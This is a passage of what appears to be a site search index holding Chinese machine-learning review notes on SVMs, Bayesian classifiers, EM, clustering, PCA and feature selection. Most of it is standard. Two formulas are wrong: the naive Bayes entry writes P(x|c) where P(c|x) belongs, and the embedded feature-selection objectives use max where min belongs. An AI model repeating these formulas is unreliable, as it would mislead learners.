\u8fdb\u884c\u4f18\u5316\uff0c\u5176\u4ed6\u53d8\u91cf\u56fa\u5b9a\uff0c\u5219\u7ea6\u675f\u4e3a</p> \\[ \\alpha_i y_i + \\alpha_j y_j = -\\sum_{k \\neq i, j} \\alpha_k y_k = c \\] <p>\u6c42\u89e3\u5bf9\u5076\u5f62\u5f0f\uff0c\u66f4\u65b0 \\(\\alpha_i, \\alpha_j\\)\uff1a</p> <p>\u4ee4</p> \\[ \\alpha_i = \\frac{c - \\alpha_j y_j}{y_i} \\] <p>\u5e26\u5165\u76ee\u6807\u51fd\u6570\uff0c\u5f97\u5230\u5355\u53d8\u91cf\u4e8c\u6b21\u89c4\u5212\u95ee\u9898\uff0c\u89e3\u5f97 \\(\\alpha_j\\)\uff0c\u518d\u66f4\u65b0 \\(\\alpha_i\\)\u3002</p> <p>\u6839\u636e\u6bcf\u4e2a\u652f\u6301\u5411\u91cf\u8ba1\u7b97\u51fa \\(b\\)\uff0c\u53d6\u5e73\u5747\u503c\u3002</p>"},{"location":"cs/ml/review/#_40","title":"\u6838\u51fd\u6570","text":"<p>\u82e5\u6570\u636e\u7ebf\u6027\u4e0d\u53ef\u5206\uff0c\u53ef\u4f7f\u7528\u6838\u51fd\u6570\u5c06\u6570\u636e\u6620\u5c04\u5230\u9ad8\u7ef4\u7a7a\u95f4\uff0c\u518d\u5728\u9ad8\u7ef4\u7a7a\u95f4\u4e2d\u5bfb\u627e\u6700\u4f18\u8d85\u5e73\u9762\u3002</p> <p>\u5c06 \\(x_i\\) \u6620\u5c04\u5230\u9ad8\u7ef4\u7a7a\u95f4 \\(\\phi(x_i)\\)\uff0c\u5219\u4f18\u5316\u95ee\u9898\u53d8\u4e3a</p> \\[ \\begin{aligned} &amp;\\max_{\\alpha} \\sum_{i=1}^{m} \\alpha_i - \\frac{1}{2} \\sum_{i=1}^{m} \\sum_{j=1}^{m} \\alpha_i \\alpha_j y_i y_j \\phi(x_i)^T \\phi(x_j) \\\\ &amp;\\text{s.t.} \\ \\sum_{i=1}^{m} \\alpha_i y_i = 0 \\\\ &amp;\\alpha_i \\geq 0, \\ i = 1, 2, \\cdots, m \\end{aligned} \\]"},{"location":"cs/ml/review/#_41","title":"\u8f6f\u95f4\u9694\u4e0e\u6b63\u5219\u5316","text":"<p>\u5141\u8bb8\u4e00\u4e9b\u6837\u672c\u4e0d\u6ee1\u8db3\u7ea6\u675f\u6761\u4ef6\u3002\u4f7f\u7528 0/1 \u635f\u5931\u51fd\u6570\uff1a</p> \\[ l_{0/1}(z) = \\begin{cases} 1, &amp; z &lt; 0 \\\\ 0, &amp; z \\geq 0 \\end{cases} \\] <p>\u5219\u4f18\u5316\u76ee\u6807\u53d8\u4e3a</p> \\[ \\min_{\\omega, b} \\frac{1}{2} \\|\\omega\\|^2 + C \\sum_{i=1}^{m} l_{0/1}(y_i(\\omega^T x_i + b) - 1) \\] <p>\u7136\u800c 0/1 \u635f\u5931\u51fd\u6570\u975e\u51f8\uff0c\u4e0d\u8fde\u7eed\uff0c\u4e0d\u53ef\u5bfc\uff0c\u4e0d\u6613\u4f18\u5316\u3002\u4f7f\u7528 Hinge \u635f\u5931\u51fd\u6570\u8fdb\u884c\u66ff\u4ee3\uff1a</p> \\[ \\min_{\\omega, b} \\frac{1}{2} \\|\\omega\\|^2 + C \\sum_{i=1}^{m} \\max(0, 1-y_i(\\omega^T x_i + b)) \\] <p>\u5f53 \\(C\\) \u8f83\u5927\u65f6\uff0c\u5bf9\u8bef\u5206\u7c7b\u7684\u60e9\u7f5a\u8f83\u5927\uff0c\u6a21\u578b\u66f4\u5173\u6ce8\u6b63\u786e\u5206\u7c7b\uff1b\u5f53 \\(C\\) \u8f83\u5c0f\u65f6\uff0c\u5bf9\u8bef\u5206\u7c7b\u7684\u60e9\u7f5a\u8f83\u5c0f\uff0c\u6a21\u578b\u66f4\u5173\u6ce8\u95f4\u9694\u7684\u6700\u5927\u5316\u3002</p> <p>\u8f6c\u6362\u4e3a\u5bf9\u5076\u95ee\u9898\uff1a</p> \\[ \\begin{aligned} &amp;\\max_{\\alpha} \\sum_{i=1}^{m} \\alpha_i - \\frac{1}{2} \\sum_{i=1}^{m} \\sum_{j=1}^{m} \\alpha_i \\alpha_j y_i y_j x_i^T x_j \\\\ &amp;\\text{s.t.} \\ \\sum_{i=1}^{m} \\alpha_i y_i = 0 \\\\ &amp;0 \\leq \\alpha_i \\leq C, \\ i = 1, 2, \\cdots, m \\end{aligned} \\] <p>\u6b63\u5219\u5316\uff1a\u66f4\u4e00\u822c\u7684\u5f62\u5f0f\u4e3a</p> \\[ \\min_{f} \\Omega(f) + C \\sum_{i=1}^{m} l(f(x_i), y_i) \\] <p>\u5176\u4e2d \\(\\Omega(f)\\) \u4e3a\u7ed3\u6784\u98ce\u9669\uff0c\\(l(f(x_i), y_i)\\) \u4e3a\u7ecf\u9a8c\u98ce\u9669\u3002</p>"},{"location":"cs/ml/review/#_42","title":"\u652f\u6301\u5411\u91cf\u56de\u5f52","text":"<p>\u5141\u8bb8\u6a21\u578b\u8f93\u51fa\u548c\u5b9e\u9645\u8f93\u51fa\u4e4b\u95f4\u5b58\u5728 \\(2\\epsilon\\) \u7684\u504f\u5dee\u3002</p> <p>\u843d\u5165\u95f4\u9694\u5e26\u7684\u6837\u672c\u4e0d\u8ba1\u7b97\u635f\u5931</p>"},{"location":"cs/ml/review/#_43","title":"\u8d1d\u53f6\u65af\u5206\u7c7b\u5668","text":""},{"location":"cs/ml/review/#_44","title":"\u8d1d\u53f6\u65af\u51b3\u7b56\u8bba","text":"<p>\u7c7b\u522b\u6807\u8bb0 \\(\\mathcal{Y} = \\{c_1, c_2, \\cdots, c_N\\}\\)\uff0c\\(\\lambda_{ij}\\) \u4e3a\u5c06\u7c7b\u522b \\(c_j\\) \u5206\u7c7b\u4e3a \\(c_i\\) \u7684\u635f\u5931\u3002</p> <p>\u540e\u9a8c\u6982\u7387 \\(P(c_i|x)\\) \u4e3a\u6837\u672c \\(x\\) \u5c5e\u4e8e\u7c7b\u522b \\(c_i\\) \u7684\u6982\u7387\u3002\u5c06 \\(x\\) \u5206\u7c7b\u4e3a \\(c_i\\) \u7684\u671f\u671b\u635f\u5931\u4e3a</p> \\[ R(c_i|x) = \\sum_{j=1}^{N} \\lambda_{ij} P(c_j|x) \\] <p>\u4efb\u52a1\u662f\u5bfb\u627e\u4e00\u4e2a\u5224\u5b9a\u51c6\u5219 \\(h : \\mathcal{X} \\mapsto \\mathcal{Y}\\)\uff0c\u4f7f\u5f97\u671f\u671b\u635f\u5931\u6700\u5c0f\uff1a</p> \\[ R(h) = \\mathbb{E}_x[R(h(x)|x)] \\] <p>\u8d1d\u53f6\u65af\u5224\u5b9a\u51c6\u5219\uff1a\u5bf9\u4e8e\u6bcf\u4e2a\u6837\u672c \\(x\\)\uff0c\u9009\u62e9\u4f7f\u5f97 \\(R(c_i|x)\\) \u6700\u5c0f\u7684\u7c7b\u522b \\(c_i\\) \u4f5c\u4e3a\u9884\u6d4b\u7c7b\u522b\uff1a</p> \\[ h^*(x) = \\arg\\min_{c \\in \\mathcal{Y}} R(c|x) \\] <p>\\(h^*\\) \u4e3a\u8d1d\u53f6\u65af\u6700\u4f18\u5206\u7c7b\u5668\uff0c\\(R(h^*)\\) \u4e3a\u8d1d\u53f6\u65af\u98ce\u9669\uff0c\\(1-R(h^*)\\) \u53cd\u6620\u4e86\u5206\u7c7b\u5668\u80fd\u8fbe\u5230\u7684\u6700\u597d\u6027\u80fd\u3002</p> <p>\u82e5\u76ee\u6807\u662f\u6700\u5c0f\u5316\u5206\u7c7b\u9519\u8bef\u7387\uff0c\u5219\u635f\u5931\u4e3a</p> \\[ \\lambda_{ij} = \\begin{cases} 0, &amp; i = j \\\\ 1, &amp; i \\neq j \\end{cases} \\] <p>\u5219\u671f\u671b\u635f\u5931\u4e3a</p> \\[ R(c_i|x) = \\sum_{j \\neq i} P(c_j|x) = 1 - P(c_i|x) \\] <p>\u5219\u6700\u4f18\u5206\u7c7b\u5668\u4e3a</p> \\[ h^*(x) = \\arg\\max_{c \\in \\mathcal{Y}} P(c|x) \\] <p>\u83b7\u53d6\u540e\u9a8c\u6982\u7387 \\(P(c|x)\\) \u7684\u65b9\u6cd5\uff1a</p> <ul> <li>\u5224\u522b\u5f0f\u6a21\u578b\uff1a\u5bf9 \\(P(c|x)\\) \u5efa\u6a21</li> <li> <p>\u751f\u6210\u5f0f\u6a21\u578b\uff1a\u5148\u5bf9\u8054\u5408\u6982\u7387\u5206\u5e03 \\(P(x, c)\\) \u5efa\u6a21\uff0c\u518d\u7531\u6b64\u5f97\u5230 \\(P(c|x)\\)</p> \\[ P(c|x) = \\frac{P(x, c)}{P(x)} = \\frac{P(x|c)P(c)}{P(x)} \\] <p>\u5176\u4e2d</p> <ul> <li>\\(P(c)\\) \u4e3a\u7c7b\u522b\u5148\u9a8c\u6982\u7387</li> <li>\\(P(x|c)\\) \u4e3a\u7c7b\u6761\u4ef6\u6982\u7387\uff0c\u79f0\u4e3a\u4f3c\u7136</li> <li>\\(P(x)\\) \u4e3a\u8bc1\u636e\u56e0\u5b50</li> </ul> </li> </ul>"},{"location":"cs/ml/review/#_45","title":"\u6781\u5927\u4f3c\u7136\u4f30\u8ba1","text":"<p>\u5148\u5047\u8bbe\u5177\u6709\u67d0\u79cd\u6982\u7387\u5206\u5e03\uff0c\u88ab\u53c2\u6570 \\(\\theta_c\\) \u552f\u4e00\u786e\u5b9a\uff0c\u518d\u901a\u8fc7\u8bad\u7ec3\u6570\u636e\u4f30\u8ba1\u53c2\u6570\u3002</p> <p>\u5c06 \\(P(x|c)\\) \u8bb0\u4e3a \\(P(x|\\theta_c)\\)\u3002\u8bbe \\(D_c\\) \u4e3a\u7c7b\u522b \\(c\\) \u7684\u8bad\u7ec3\u6570\u636e\u96c6\uff0c\u5219 \\(D_c\\) \u7684\u4f3c\u7136\u4e3a</p> \\[ P(D_c|\\theta_c) = \\prod_{x \\in D_c} P(x|\\theta_c) \\] <p>\u4ee3\u8868\u53d6\u5f97 \\(D_c\\) \u7684\u6982\u7387\u3002\u901a\u5e38\u4f7f\u7528\u5bf9\u6570\u4f3c\u7136\uff1a</p> \\[ LL(\\theta_c) = \\log P(D_c|\\theta_c) = \\sum_{x \\in D_c} \\log P(x|\\theta_c) \\] <p>\u6700\u5927\u5316\u5bf9\u6570\u4f3c\u7136\uff0c\u5f97\u5230\u53c2\u6570\u4f30\u8ba1 \\(\\hat{\\theta}_c\\)\uff1a</p> \\[ \\hat{\\theta}_c = \\arg\\max_{\\theta_c} LL(\\theta_c) \\]"},{"location":"cs/ml/review/#_46","title":"\u6734\u7d20\u8d1d\u53f6\u65af\u5206\u7c7b\u5668","text":"<p>\u5047\u8bbe\u6bcf\u4e2a\u5c5e\u6027\u72ec\u7acb\u5730\u5bf9\u5206\u7c7b\u7ed3\u679c\u4ea7\u751f\u5f71\u54cd\uff0c\u5373</p> \\[ P(x|c) = \\frac{P(c)P(c|x)}{P(x)} = \\frac{P(c)}{P(x)} \\prod_{i=1}^{d} P(x_i|c) \\] <p>\u5219\u6734\u7d20\u8d1d\u53f6\u65af\u5206\u7c7b\u5668\u4e3a</p> \\[ h_{nb}(x) = \\arg\\max_{c \\in \\mathcal{Y}} P(c) \\prod_{i=1}^{d} P(x_i|c) \\] <p>\u7c7b\u5148\u9a8c\u6982\u7387 \\(P(c) = \\frac{|D_c|}{|D|}\\)\u3002</p> <p>\u4ee4 \\(D_{c, x_i}\\) \u4e3a \\(D_c\\) \u4e2d\u7b2c \\(i\\) \u4e2a\u5c5e\u6027\u53d6\u503c\u4e3a \\(x_i\\) \u7684\u6837\u672c\u5b50\u96c6\uff0c\u4f30\u8ba1\u7c7b\u6761\u4ef6\u6982\u7387 \\(P(x_i|c)\\) \u4e3a</p> \\[ P(x_i|c) = \\frac{|D_{c, x_i}|}{|D_c|} \\] <p>\u8fc7\u7a0b\uff1a</p> <ul> <li>\u8ba1\u7b97\u7c7b\u5148\u9a8c\u6982\u7387 \\(P(c)\\)</li> <li>\u8ba1\u7b97\u7c7b\u6761\u4ef6\u6982\u7387 \\(P(x_i|c)\\)</li> <li>\u8ba1\u7b97\u4f7f\u5f97 \\(P(c) \\prod_{i=1}^{d} P(x_i|c)\\) \u6700\u5927\u7684\u7c7b\u522b \\(c\\) \u4f5c\u4e3a\u9884\u6d4b\u7c7b\u522b</li> </ul> <p>\u5e73\u6ed1\uff1a\u4f7f\u7528\u62c9\u666e\u62c9\u65af\u4fee\u6b63\uff0c\u907f\u514d\u6982\u7387\u4e3a 0\u3002</p> <p>\u4ee4 \\(N\\) \u8868\u793a\u8bad\u7ec3\u96c6 \\(D\\) \u4e2d\u53ef\u80fd\u7684\u7c7b\u522b\u6570\uff0c\\(N_i\\) \u8868\u793a\u7b2c \\(i\\) \u4e2a\u5c5e\u6027\u53ef\u80fd\u7684\u53d6\u503c\u6570\uff0c\u5219</p> \\[ \\begin{aligned} P(c) &amp;= \\frac{|D_c| + 1}{|D| + N} \\\\ P(x_i|c) &amp;= \\frac{|D_{c, x_i}| + 1}{|D_c| + N_i} \\end{aligned} \\]"},{"location":"cs/ml/review/#_47","title":"\u534a\u6734\u7d20\u8d1d\u53f6\u65af\u5206\u7c7b\u5668","text":"<p>\u9002\u5f53\u8003\u8651\u4e00\u90e8\u5206\u5c5e\u6027\u95ee\u7684\u76f8\u4e92\u4f9d\u8d56\u4fe1\u606f\u3002</p> <p>\u72ec\u4f9d\u8d56\u4f30\u8ba1\uff1a\u5047\u8bbe\u6bcf\u4e2a\u5c5e\u6027\u5728\u7c7b\u522b\u4e4b\u5916\u6700\u591a\u4ec5\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u5176\u4ed6\u5c5e\u6027\u3002</p>"},{"location":"cs/ml/review/#_48","title":"\u8d1d\u53f6\u65af\u7f51","text":"<p>\u8d1d\u53f6\u65af\u7f51\u662f\u4e00\u4e2a\u6709\u5411\u65e0\u73af\u56fe\uff0c\u7ed3\u70b9\u8868\u793a\u968f\u673a\u53d8\u91cf\uff0c\u8fb9\u8868\u793a\u53d8\u91cf\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u3002\u4f7f\u7528\u6761\u4ef6\u6982\u7387\u8868\u63cf\u8ff0\u7ed3\u70b9\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u3002</p>"},{"location":"cs/ml/review/#em","title":"EM \u7b97\u6cd5","text":"<p>\u5b58\u5728\u9690\u53d8\u91cf\u7684\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528 EM \u7b97\u6cd5\u8fdb\u884c\u53c2\u6570\u4f30\u8ba1\u3002</p> <p>\u4ee4 \\(X\\) \u4e3a\u89c2\u6d4b\u53d8\u91cf\uff0c\\(Z\\) \u4e3a\u9690\u53d8\u91cf\uff0c\\(\\Theta\\) \u4e3a\u6a21\u578b\u53c2\u6570\uff0c\u5219\u8981\u6700\u5927\u5316\u5bf9\u6570\u4f3c\u7136</p> \\[ LL(\\Theta \\mid X, Z) = \\ln P(X, Z \\mid \\Theta) \\] <p>\u901a\u8fc7\u5bf9 \\(Z\\) \u6c42\u671f\u671b\uff0c\u6700\u5927\u5316\u8fb9\u9645\u4f3c\u7136</p> \\[ LL(\\Theta \\mid X) = \\ln P(X \\mid \\Theta) = \\ln \\sum_Z P(X, Z \\mid \\Theta) \\] <p>EM \u7b97\u6cd5\uff1a</p> <ul> <li>E \u6b65\uff1a\u5df2\u77e5\u53c2\u6570 \\(\\Theta\\)\uff0c\u8ba1\u7b97\u5bf9\u6570\u4f3c\u7136\u5173\u4e8e\u9690\u53d8\u91cf \\(Z\\) \u7684\u671f\u671b</li> <li>M \u6b65\uff1a\u5df2\u77e5 \\(Z\\)\uff0c\u5bfb\u627e\u53c2\u6570 \\(\\Theta\\) \u4f7f\u5f97\u5bf9\u6570\u4f3c\u7136\u671f\u671b\u6700\u5927\u5316</li> </ul>"},{"location":"cs/ml/review/#_49","title":"\u96c6\u6210\u5b66\u4e60","text":"<p>\u96c6\u6210\u5b66\u4e60\uff08ensemble learning\uff09\u901a\u8fc7\u6784\u5efa\u5e76\u7ed3\u5408\u591a\u4e2a\u5b66\u4e60\u5668\u6765\u63d0\u5347\u6027\u80fd\u3002</p>"},{"location":"cs/ml/review/#_50","title":"\u805a\u7c7b","text":""},{"location":"cs/ml/review/#_51","title":"\u6027\u80fd\u5ea6\u91cf","text":"<ul> <li>\u5916\u90e8\u6307\u6807\uff1a\u4e0e\u67d0\u4e2a\u201c\u53c2\u8003\u6a21\u578b\u201d\u8fdb\u884c\u6bd4\u8f83</li> <li>\u5185\u90e8\u6307\u6807\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u53c2\u8003\u6a21\u578b</li> </ul> <p>\u76ee\u6807\uff1a\u7c07\u5185\u76f8\u4f3c\u5ea6\u9ad8\uff0c\u7c07\u95f4\u76f8\u4f3c\u5ea6\u4f4e\u3002</p>"},{"location":"cs/ml/review/#_52","title":"\u8ddd\u79bb\u8ba1\u7b97","text":"<p>\u95f5\u53ef\u592b\u65af\u57fa\u8ddd\u79bb\uff1a</p> \\[ \\text{dist}_{\\text{mk}}(x_i, x_j) = (\\sum_{u=1}^{d} |x_{iu} - x_{ju}|^p)^{1/p} \\] <ul> <li>\\(p = 1\\) \u4e3a\u66fc\u54c8\u987f\u8ddd\u79bb</li> <li>\\(p = 2\\) \u4e3a\u6b27\u6c0f\u8ddd\u79bb</li> </ul>"},{"location":"cs/ml/review/#_53","title":"\u805a\u7c7b\u65b9\u6cd5","text":"<ul> <li>\u539f\u578b\u805a\u7c7b\uff1a\u6709\u7c07\u4e2d\u5fc3\u7684\u805a\u7c7b\u3002K \u5747\u503c\u805a\u7c7b\u3002</li> <li>\u5bc6\u5ea6\u805a\u7c7b\uff1a\u4ece\u6837\u672c\u5bc6\u5ea6\u7684\u89d2\u5ea6\u6765\u8003\u5bdf\u6837\u672c\u4e4b\u95f4\u7684\u53ef\u8fde\u63a5\u6027\u3002DBSCAN \u7b97\u6cd5\u3002</li> <li>\u5c42\u6b21\u805a\u7c7b\uff1a\u81ea\u5e95\u5411\u4e0a\u6216\u81ea\u9876\u5411\u4e0b\u7684\u805a\u7c7b\u65b9\u6cd5\u3002AGNES \u7b97\u6cd5\u3002</li> </ul>"},{"location":"cs/ml/review/#k","title":"K \u5747\u503c\u805a\u7c7b","text":"<p>\u7c07\u4e2d\u5fc3\u4e3a\u7c07\u5185\u6837\u672c\u7684\u5747\u503c\u3002</p>"},{"location":"cs/ml/review/#_54","title":"\u964d\u7ef4\u4e0e\u5ea6\u91cf\u5b66\u4e60","text":""},{"location":"cs/ml/review/#k-k-nn","title":"k \u8fd1\u90bb\u5b66\u4e60 k-NN","text":"<p>\u7ed9\u5b9a\u6d4b\u8bd5\u6837\u672c\uff0c\u57fa\u4e8e\u67d0\u79cd\u8ddd\u79bb\u5ea6\u91cf\u627e\u51fa\u8bad\u7ec3\u96c6\u4e2d\u4e0e\u5176\u6700\u9760\u8fd1\u7684 \\(k\\) \u4e2a\u8bad\u7ec3\u6837\u672c\uff0c\u7136\u540e\u57fa\u4e8e\u8fd9 \\(k\\) \u4e2a\u201c\u90bb\u5c45\u201d\u7684\u4fe1\u606f\u6765\u8fdb\u884c\u9884\u6d4b\u3002</p> <p>\u6700\u8fd1\u90bb\u5206\u7c7b\u5668\uff0c1-NN \u5206\u7c7b\u5668\uff0c\u51fa\u9519\u7684\u6982\u7387</p> \\[ P(err) = 1 - \\sum_{c\\in\\mathcal{Y}} P(c|x) P(c|z) \\] <p>\u5176\u4e2d \\(z\\) \u4e3a\u6837\u672c \\(x\\) \u7684\u6700\u8fd1\u90bb\u3002</p> <p>\u6700\u8fd1\u90bb\u5206\u7c7b\u5668\u7684\u6cdb\u5316\u8bef\u5dee\u4e0d\u8d85\u8fc7\u8d1d\u53f6\u65af\u6700\u4f18\u5206\u7c7b\u5668\u7684\u8bef\u5dee\u7684\u4e24\u500d\u3002</p>"},{"location":"cs/ml/review/#_55","title":"\u4f4e\u7ef4\u5d4c\u5165","text":"<p>\u5c06\u9ad8\u7ef4\u6570\u636e\u6620\u5c04\u5230\u4f4e\u7ef4\u7a7a\u95f4\uff0c\u4fdd\u7559\u6570\u636e\u7684\u4e3b\u8981\u7ed3\u6784\u3002</p> <p>\u76ee\u6807\uff1a\u4fdd\u6301\u6570\u636e\u4e4b\u95f4\u7684\u76f8\u5bf9\u8ddd\u79bb\u3002</p> <p>\u591a\u7ef4\u7f29\u653e\uff08MDS\uff09\uff1a\u6700\u5c0f\u5316\u539f\u59cb\u6570\u636e\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u4e0e\u5d4c\u5165\u6570\u636e\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u4e4b\u95f4\u7684\u5dee\u5f02\u3002\u601d\u8def\uff1a\u4fdd\u6301\u5185\u79ef\u4e0d\u53d8\u3002</p>"},{"location":"cs/ml/review/#pca","title":"\u4e3b\u6210\u5206\u5206\u6790 PCA","text":"<p>\u7ed9\u5b9a \\(d\\) \u7ef4\u7a7a\u95f4\u4e2d\u7684\u6837\u672c \\(X = (x_1, x_2, \\cdots, x_m) \\in \\mathbb{R}^{d\\times m}\\)\uff0c\u53d8\u6362\u4e4b\u540e\u5f97\u5230 \\(d'&lt; d\\) \u7ef4\u7a7a\u95f4\u4e2d\u7684\u6837\u672c</p> \\[ Z = W^T X \\] <p>\u5176\u4e2d \\(W \\in \\mathbb{R}^{d \\times d'}\\) \u4e3a\u53d8\u6362\u77e9\u9635\u3002</p> <p>PCA \u7684\u4f18\u5316\u76ee\u6807\uff1a</p> \\[ \\max_{W} \\mathrm{tr}(W^T X X^T W) \\quad \\text{s.t.} \\quad W^T W = I \\] <p>\u5bf9 \\(X\\) \u8fdb\u884c\u4e2d\u5fc3\u5316\u540e\uff0c\u5bf9 \\(X X^T\\) \u8fdb\u884c\u7279\u5f81\u503c\u5206\u89e3\uff0c\u5f97\u5230\u7279\u5f81\u503c\u548c\u7279\u5f81\u5411\u91cf\uff0c\u6309\u7167\u7279\u5f81\u503c\u5927\u5c0f\u9009\u62e9\u524d \\(d'\\) \u4e2a\u7279\u5f81\u5411\u91cf\u7ec4\u6210\u53d8\u6362\u77e9\u9635 \\(W = (w_1, w_2, \\cdots, w_{d'})\\)\uff0c\u8fd9\u51e0\u4e2a\u7279\u5f81\u5411\u91cf\u5bf9\u5e94\u7684\u5e73\u9762\u5c31\u662f\u6570\u636e\u7684\u4e3b\u6210\u5206\u3002</p>"},{"location":"cs/ml/review/#_56","title":"\u6d41\u5f62\u5b66\u4e60","text":"<ul> <li>\u6784\u9020\u8fd1\u90bb\u56fe</li> <li>\u4f7f\u7528\u6700\u77ed\u8def\u7b97\u6cd5\u8fd1\u4f3c\u4e24\u70b9\u4e4b\u95f4\u7684\u6d4b\u5730\u7ebf\u8ddd\u79bb</li> <li>\u57fa\u4e8e\u8ddd\u79bb\u77e9\u9635\u4f7f\u7528 MDS \u7b97\u6cd5\u8fdb\u884c\u964d\u7ef4</li> </ul>"},{"location":"cs/ml/review/#_57","title":"\u5ea6\u91cf\u5b66\u4e60","text":"<p>\u901a\u8fc7\u53c2\u6570\u5316\u5b66\u4e60\u8ddd\u79bb\u5ea6\u91cf\u3002</p> <p>\u9a6c\u6c0f\u8ddd\u79bb\uff1a</p> \\[ \\text{dist}^2_{\\text{mah}}(x_i, x_j) = (x_i - x_j)^T M (x_i - x_j) \\] <p>\u5176\u4e2d \\(M\\) \u4e3a\u5ea6\u91cf\u77e9\u9635\uff0c\u5bf9\u5ea6\u91cf\u77e9\u9635\u8fdb\u884c\u5b66\u4e60\u3002</p>"},{"location":"cs/ml/review/#_58","title":"\u7279\u5f81\u9009\u62e9\u4e0e\u7a00\u758f\u5b66\u4e60","text":"<p>\u7279\u5f81\u7684\u5206\u7c7b\uff1a</p> <ul> <li>\u76f8\u5173\u7279\u5f81\uff1a\u5bf9\u5f53\u524d\u5b66\u4e60\u4efb\u52a1\u6709\u7528\u7684\u7279\u5f81</li> <li>\u65e0\u5173\u7279\u5f81\uff1a\u5bf9\u5f53\u524d\u5b66\u4e60\u4efb\u52a1\u65e0\u7528\u7684\u7279\u5f81</li> <li>\u5197\u4f59\u7279\u5f81\uff1a\u4e0e\u5176\u4ed6\u7279\u5f81\u7ebf\u6027\u76f8\u5173\u7684\u7279\u5f81</li> </ul>"},{"location":"cs/ml/review/#_59","title":"\u7279\u5f81\u9009\u62e9","text":"<p>\u786e\u4fdd\u4e0d\u4e22\u5931\u91cd\u8981\u7279\u5f81\u3002</p> <p>\u65b9\u6cd5\uff1a</p> <ol> <li>\u4ea7\u751f\u521d\u59cb\u5019\u9009\u5b50\u96c6</li> <li>\u8bc4\u4ef7\u5019\u9009\u5b50\u96c6\u7684\u597d\u574f</li> <li>\u6839\u636e\u7ed3\u679c\u4ea7\u751f\u65b0\u7684\u5019\u9009\u5b50\u96c6\uff0c\u91cd\u590d 2</li> </ol>"},{"location":"cs/ml/review/#_60","title":"\u5b50\u96c6\u641c\u7d22","text":"<p>\u7528\u8d2a\u5fc3\u7b56\u7565\u9009\u62e9\u5305\u542b\u91cd\u8981\u4fe1\u606f\u7684\u7279\u5f81\u5b50\u96c6\u3002</p> <ul> <li>\u524d\u5411\u641c\u7d22\uff1a\u9010\u6b65\u589e\u52a0\u7279\u5f81</li> <li>\u540e\u5411\u641c\u7d22\uff1a\u9010\u6b65\u51cf\u5c11\u7279\u5f81</li> <li>\u53cc\u5411\u641c\u7d22\uff1a\u6bcf\u4e00\u8f6e\u9010\u6e10\u589e\u52a0\u76f8\u5173\u7279\u5f81\uff0c\u540c\u65f6\u51cf\u5c11\u65e0\u5173\u7279\u5f81</li> </ul>"},{"location":"cs/ml/review/#_61","title":"\u5b50\u96c6\u8bc4\u4ef7","text":"<p>\u6bd4\u8f83\u7279\u5f81\u5b50\u96c6\u5bf9\u5e94\u7684\u5212\u5206\u4e0e\u6837\u672c\u6807\u8bb0\u5bf9\u5e94\u7684\u5212\u5206\u7684\u5dee\u5f02\u3002</p> <p>\u65b9\u6cd5\uff1a\u4fe1\u606f\u71b5</p>"},{"location":"cs/ml/review/#_62","title":"\u7279\u5f81\u9009\u62e9\u65b9\u6cd5","text":"<ul> <li>\u8fc7\u6ee4\u5f0f\uff08filter\uff09</li> <li>\u5305\u88f9\u5f0f\uff08wrapper\uff09</li> <li>\u5d4c\u5165\u5f0f\uff08embedded\uff09</li> </ul>"},{"location":"cs/ml/review/#_63","title":"\u8fc7\u6ee4\u5f0f\u7279\u5f81\u9009\u62e9","text":"<p>\u5148\u5bf9\u6570\u636e\u96c6\u8fdb\u884c\u7279\u5f81\u9009\u62e9\uff0c\u7136\u540e\u518d\u8bad\u7ec3\u5b66\u4e60\u5668\uff0c\u7279\u5f81\u9009\u62e9\u8fc7\u7a0b\u4e0e\u5b66\u4e60\u5668\u65e0\u5173\u3002</p> <p>Relief \u7b97\u6cd5\uff1a\u5bf9\u6bcf\u4e2a\u6837\u672c\uff0c\u5148\u5728\u540c\u7c7b\u6837\u672c\u4e2d\u627e\u51fa\u6700\u8fd1\u90bb\uff0c\u518d\u5728\u5f02\u7c7b\u6837\u672c\u4e2d\u627e\u51fa\u6700\u8fd1\u90bb\uff0c\u8ba1\u7b97\u7279\u5f81\u7684\u6743\u91cd\u3002</p>"},{"location":"cs/ml/review/#_64","title":"\u5305\u88f9\u5f0f\u7279\u5f81\u9009\u62e9","text":"<p>\u628a\u6700\u7ec8\u5c06\u8981\u4f7f\u7528\u7684\u5b66\u4e60\u5668\u7684\u6027\u80fd\u4f5c\u4e3a\u7279\u5f81\u5b50\u96c6\u7684\u8bc4\u4ef7\u51c6\u5219\u3002</p> <p>\u9700\u591a\u6b21\u8bad\u7ec3\u5b66\u4e60\u5668\uff0c\u56e0\u6b64\u5305\u88f9\u5f0f\u7279\u5f81\u9009\u62e9\u7684\u8ba1\u7b97\u5f00\u9500\u901a\u5e38\u6bd4\u8f83\u5927\u3002</p> <p>LVM \u7b97\u6cd5\uff1a\u4f7f\u7528\u968f\u673a\u7b56\u7565\u8fdb\u884c\u5b50\u96c6\u641c\u7d22\uff0c\u5c06\u6700\u7ec8\u5206\u7c7b\u5668\u7684\u8bef\u5dee\u4f5c\u4e3a\u7279\u5f81\u5b50\u96c6\u7684\u8bc4\u4ef7\u51c6\u5219\u3002</p>"},{"location":"cs/ml/review/#_65","title":"\u5d4c\u5165\u5f0f\u7279\u5f81\u9009\u62e9","text":"<p>\u5c06\u7279\u5f81\u9009\u62e9\u8fc7\u7a0b\u4e0e\u5b66\u4e60\u5668\u8bad\u7ec3\u8fc7\u7a0b\u878d\u4e3a\u4e00\u4f53\uff0c\u4e24\u8005\u5728\u540c\u4e00\u4e2a\u4f18\u5316\u8fc7\u7a0b\u4e2d\u5b8c\u6210\u3002</p> <p>\u82e5\u6700\u4f18\u5316\u95ee\u9898\u4e3a</p> \\[ \\max_{\\omega} \\sum_{i=1}^{m} (y_i - \\omega^T x_i)^2 \\] <p>\u4f7f\u7528\u5d4c\u5165\u5f0f\u7279\u5f81\u9009\u62e9\uff0c\u52a0\u5165\u6b63\u5219\u9879</p> \\[ \\max_{\\omega} \\sum_{i=1}^{m} (y_i - \\omega^T x_i)^2 + \\lambda \\|\\omega\\|^2_2 \\] <p>\u5f15\u5165 \\(L_2\\) \u8303\u6570\u6b63\u5219\u5316\uff0c\u964d\u4f4e\u8fc7\u62df\u5408\u7684\u98ce\u9669\u3002</p> <ul> <li>\\(L_2\\) 